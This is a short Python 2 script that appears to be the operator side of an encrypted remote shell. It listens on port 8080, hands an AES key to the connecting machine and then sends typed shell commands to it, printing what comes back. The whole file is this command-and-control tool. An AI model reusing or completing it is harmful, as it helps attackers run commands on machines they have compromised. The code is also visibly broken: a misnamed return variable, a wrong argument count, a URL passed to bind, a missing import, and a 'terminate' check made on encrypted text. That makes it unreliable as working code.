import os, socket, random
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA

def keyGen():
	newKey = RSA.generate(4096)
	publicKey = newKey.publickey().export("PEM")
	#privateKey = newKey.exportKey("PEM")
	print "This is the publicKey", publicKey
	#print "\n\r\n\r"
	#print  "This is the privateKey", privateKey
	return publickey#, privateKey

def encryptAES(aes, publicKey):
	#publicKey = """ TO DO """
	encrypt = RSA.importKey(publicKey)
	encryptedData = encrypt.encrypt(aes, 0)
	return encryptedData[0]

def encrypt(msg):
	encrypt = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
	return encrypt.encrypt(msg)

def decrypt(cipher):
	decrypt = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
	return decrypt.decrypt(cipher)

def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(("http://192.198.56.102", 8080))
	s.listen(1)
	print "[+]Sever is listening on port 8080"
	conn, addr = s.accept()
	print "[+]Accepted connection from IP:  ", addr
	global key
	key = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + '^!\$%&/()=?{[]}+~#-_.:,;<>|\\') for _ in range(16))
	print "[*]AES key has been generated \n", key
	conn.send( encryptAES(key))
	global counter
	counter = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + '^!\$%&/()=?{[]}+~#-_.:,;<>|\\') for _ in range(32))

	while True:
		command = raw_input("Shell>>>")
		command = encrypt(command)

		if 'terminate' in command:
			conn.send('terminate')
			conn.close()
			break

		else:
			conn.send(command)
			print decrypt( conn.recv(1024) )
def main():
	keyGen()
	connect()
main()